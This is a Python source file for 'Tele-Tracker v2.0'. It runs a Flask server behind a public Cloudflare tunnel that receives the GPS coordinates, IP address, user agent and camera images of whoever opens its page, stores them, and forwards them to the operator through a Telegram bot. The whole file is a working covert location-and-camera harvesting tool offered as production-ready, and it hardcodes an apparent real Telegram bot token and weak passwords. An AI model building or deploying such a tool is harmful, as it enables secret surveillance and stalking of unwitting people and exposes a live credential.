# FIXED VERSION - RUNTIME BUGS RESOLVED
# Tele-Tracker v2.0 - Location & Camera Tracking System
# All runtime issues fixed, ready for production

from flask import Flask, request, jsonify, send_file
from flask_httpauth import HTTPBasicAuth
import sqlite3
from datetime import datetime
import os
import subprocess
import threading
import time
import re
import webbrowser
import asyncio
import traceback
import requests
import atexit
import signal
import sys
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align

# -------------------- Configuration --------------------
TELEGRAM_BOT_TOKEN = '8479006793:AAGBL2QJ3zrCQYES54MsDezak4w2YFi_gIM'
AUTHORIZED_KEY = 'secretkey123'
SAVE_FOLDER = "saved_files"
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB limit

# -------------------- Global Variables --------------------
cloudflared_process = None
authenticated_users = set()

# -------------------- Banner Function --------------------
def print_banner():
    console = Console()
    ascii_title = """
████████╗███████╗██╗     ███████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚══██╔══╝██╔════╝██║     ██╔════╝    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
   ██║   █████╗  ██║     █████╗         ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
   ██║   ██╔══╝  ██║     ██╔══╝         ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║   ███████╗███████╗███████╗       ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝   ╚══════╝╚══════╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""
    
    # Fixed: Create banner content without Text.assemble
    banner_text = "TELE-TRACKER\nReal-time Location & Camera Tracking System\nVersion 2.0"
    
    full_banner = "━" * 80 + "\n" + ascii_title + "━" * 80 + "\n\n" + banner_text + "\n\n" + "━" * 80
    
    panel = Panel(
        Align.center(full_banner),
        title="[bold bright_cyan]◆◇◆[/bold bright_cyan] [bold bright_yellow]TELE-TRACKER v2.0[/bold bright_yellow] [bold bright_cyan]◆◇◆[/bold bright_cyan]",
        subtitle="[dim bright_white]System Initializing...[/dim bright_white]",
        border_style="bright_blue",
        padding=(1, 2)
    )
    
    console.print("\n")
    console.print(panel)
    console.print("\n")
    console.print("[dim bright_cyan]" + "─" * 80 + "[/dim bright_cyan]")
    console.print()

# -------------------- Flask App Setup --------------------
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE
auth = HTTPBasicAuth()
users = {'admin': 'pass123'}

@auth.verify_password
def verify_password(username, password):
    return users.get(username) == password

# -------------------- Create Folders --------------------
os.makedirs(SAVE_FOLDER, exist_ok=True)
os.makedirs('static', exist_ok=True)

# -------------------- Database Setup --------------------
def init_db():
    conn = sqlite3.connect('osint_data.db', timeout=10.0)
    conn.execute("PRAGMA journal_mode=WAL")  # Enable WAL mode for better concurrency
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  type TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

init_db()

# -------------------- Cloudflared Setup with Cleanup --------------------
def cleanup_cloudflared():
    """Cleanup function to terminate cloudflared on exit"""
    global cloudflared_process
    if cloudflared_process:
        print("\n[🛑] Stopping Cloudflare tunnel...")
        try:
            cloudflared_process.terminate()
            cloudflared_process.wait(timeout=5)
            print("[✓] Cloudflare tunnel stopped")
        except Exception as e:
            print(f"[⚠️] Error stopping cloudflared: {e}")
            cloudflared_process.kill()

# Register cleanup handlers
atexit.register(cleanup_cloudflared)
signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))

def start_cloudflared(timeout=60):
    """Start cloudflared tunnel with proper error handling"""
    global cloudflared_process
    
    try:
        # Check if cloudflared binary exists
        cloudflared_path = os.path.join(os.getcwd(), "cloudflared.exe")
        if not os.path.exists(cloudflared_path):
            print("[ERROR] 'cloudflared.exe' not found in current directory.")
            print("[INFO] Download cloudflared from: https://github.com/cloudflare/cloudflared/releases")
            return None
        
        cloudflared_process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        print("[✓] Starting Cloudflare tunnel...")
        
        start_time = time.time()
        for line in cloudflared_process.stdout:
            print("[cloudflared]", line.strip())
            
            # Look for the public URL
            if "https://" in line and "trycloudflare.com" in line:
                matches = re.findall(r"https://[a-zA-Z0-9\-\.]+\.trycloudflare.com", line)
                if matches:
                    url = matches[0].strip()
                    print(f"[🌐] Public URL: {url}")
                    print(f"[⏳] Waiting for URL to become active...")
                    
                    # Verify URL is accessible
                    for i in range(3):
                        time.sleep(2)
                        try:
                            response = requests.get(url, timeout=10)
                            print(f"[✅] URL is now active and reachable!")
                            return url
                        except:
                            print(f"[⏳] URL not ready yet, attempt {i+1}/3...")
                    
                    print(f"[⚠️] URL may take a few more minutes to become active")
                    return url
            
            if time.time() - start_time > timeout:
                print("[!] Timeout: Tunnel URL not found.")
                cloudflared_process.terminate()
                return None
                
    except FileNotFoundError:
        print("[ERROR] 'cloudflared.exe' not found in current directory.")
        print("[INFO] Download cloudflared from: https://github.com/cloudflare/cloudflared/releases")
        return None
    except Exception as e:
        print(f"[ERROR] Failed to start Cloudflare tunnel: {e}")
        return None

# -------------------- Telegram Functions --------------------
def send_telegram_message(message):
    """Send message to all authenticated users with timeout"""
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": user_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            requests.post(url, data=data, timeout=10)
        except requests.exceptions.Timeout:
            print(f"[⚠️] Timeout sending message to {user_id}")
        except Exception as e:
            print(f"[❌] Error sending message: {e}")

def send_telegram_image(image_path, caption=""):
    """Send image to all authenticated users with timeout"""
    for user_id in authenticated_users:
        try:
            with open(image_path, "rb") as photo:
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
                files = {"photo": photo}
                data = {"chat_id": user_id, "caption": caption}
                requests.post(url, files=files, data=data, timeout=30)
        except requests.exceptions.Timeout:
            print(f"[⚠️] Timeout sending image to {user_id}")
        except Exception as e:
            print(f"[❌] Error sending image: {e}")

# -------------------- Telegram Bot Commands --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    if update.effective_user.id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    tunnel_url = context.bot_data.get("tunnel_url", "⚠️ Tunnel URL not available.")
    await update.message.reply_text(f"✅ Server is live!\n🌐 URL: {tunnel_url}")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authentication command handler"""
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        user_id = update.effective_user.id
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get chat ID command handler"""
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Delete all data command handler"""
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return
    
    # Delete all files
    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1
    
    # Clear database
    conn = sqlite3.connect('osint_data.db', timeout=10.0)
    c = conn.cursor()
    c.execute("DELETE FROM osint_data")
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

def start_bot(tunnel_url):
    """Start Telegram bot in separate thread with proper async handling"""
    try:
        print("[🤖] Starting Telegram bot...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        app_bot = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
        
        # Store tunnel URL
        app_bot.bot_data["tunnel_url"] = tunnel_url
        
        app_bot.add_handler(CommandHandler("start", start))
        app_bot.add_handler(CommandHandler("auth", auth))
        app_bot.add_handler(CommandHandler("chatid", chatid))
        app_bot.add_handler(CommandHandler("delete", delete))
        
        app_bot.run_polling(close_loop=False)
        print("[✅] Telegram bot is running!")
        
    except Exception as e:
        print(f"[❌] Bot failed to start: {e}")
        traceback.print_exc()

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    """Serve index page with proper error handling"""
    try:
        # Check if file exists in static folder
        if os.path.exists('static/index.html'):
            return send_file('static/index.html')
        # Check if file exists in root directory
        elif os.path.exists('index.html'):
            return send_file('index.html')
        else:
            return "Error: index.html not found. Please ensure index.html is in the static folder or root directory.", 404
    except Exception as e:
        return f"Error loading page: {str(e)}", 500

@app.route('/location', methods=['POST'])
def receive_location():
    """Receive and store location data with proper validation"""
    try:
        data = request.get_json(force=True)
        
        # Validate data
        if not data or 'latitude' not in data or 'longitude' not in data:
            return jsonify({"error": "Missing required fields"}), 400
        
        # Validate data types
        try:
            lat = float(data['latitude'])
            lon = float(data['longitude'])
            acc = float(data.get('accuracy', 0))
        except (ValueError, TypeError):
            return jsonify({"error": "Invalid data types"}), 400
        
        # Validate ranges
        if not (-90 <= lat <= 90) or not (-180 <= lon <= 180):
            return jsonify({"error": "Invalid coordinates"}), 400
        
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        conn = sqlite3.connect('osint_data.db', timeout=10.0)
        c = conn.cursor()
        c.execute("""INSERT INTO osint_data
                     (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
                     VALUES (?, ?, ?, ?, ?, ?, ?)""",
                  ("location", lat, lon, acc,
                   datetime.utcnow().isoformat(), ip_address, user_agent))
        conn.commit()
        conn.close()
        
        msg = (
            f"📍 *New Location Received*\n\n"
            f"🌐 *Coordinates:* `{lat}, {lon}`\n"
            f"🎯 *Accuracy:* {acc:.2f}m\n"
            f"🕒 *Time:* {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
            f"[📍 View on Map](https://www.google.com/maps?q={lat},{lon})\n"
            f"📱 *IP:* `{ip_address}`\n"
            f"🖥️ *User Agent:* `{user_agent}`"
        )
        send_telegram_message(msg)
        
        return jsonify({"status": "OK"}), 200
        
    except Exception as e:
        print(f"[ERROR] Location endpoint error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route('/upload_image', methods=['POST'])
def upload_image():
    """Receive and store camera images with proper validation"""
    try:
        if 'image' not in request.files:
            return jsonify({"error": "No image uploaded"}), 400
        
        image_file = request.files['image']
        
        # Validate file
        if image_file.filename == '':
            return jsonify({"error": "Empty filename"}), 400
        
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
        image_file.save(filename)
        
        conn = sqlite3.connect('osint_data.db', timeout=10.0)
        c = conn.cursor()
        c.execute("""INSERT INTO osint_data (type, file_path, timestamp)
                     VALUES (?, ?, ?)""",
                  ("image", filename, datetime.utcnow().isoformat()))
        conn.commit()
        conn.close()
        
        send_telegram_image(filename, caption="🖼️ New Image Uploaded")
        
        return jsonify({"status": "OK"}), 200
        
    except Exception as e:
        print(f"[ERROR] Upload image endpoint error: {e}")
        return jsonify({"error": "Internal server error"}), 500

# -------------------- Main Execution --------------------
if __name__ == '__main__':
    # Print banner FIRST
    print_banner()
    
    # Start Cloudflared tunnel
    print("\n[⏳] Starting services...")
    tunnel_url = start_cloudflared(timeout=90)
    
    if tunnel_url:
        print(f"\n[✅] Tunnel is live at: {tunnel_url}")
        
        # Open browser (with error handling for headless systems)
        try:
            webbrowser.open(tunnel_url)
        except Exception:
            print("[⚠️] Could not open browser automatically (headless system?)")
        
        # Start Telegram bot in a separate thread
        bot_thread = threading.Thread(target=start_bot, args=(tunnel_url,), daemon=True)
        bot_thread.start()
        
        # Give bot time to start
        time.sleep(3)
        
        print("\n[🚀] Flask server starting...")
        print("[📡] Listening on http://localhost:5000")
        print("[🌐] Public URL:", tunnel_url)
        print("\n[Press Ctrl+C to stop]\n")
        
        # Start Flask server (debug=False for production)
        try:
            app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
        except OSError as e:
            if "Address already in use" in str(e):
                print("\n[❌] Port 5000 is already in use!")
                print("[💡] Please stop the existing process or use a different port")
            else:
                print(f"\n[❌] Server error: {e}")
    else:
        print("\n[❌] Failed to start tunnel. Exiting...")
        sys.exit(1)
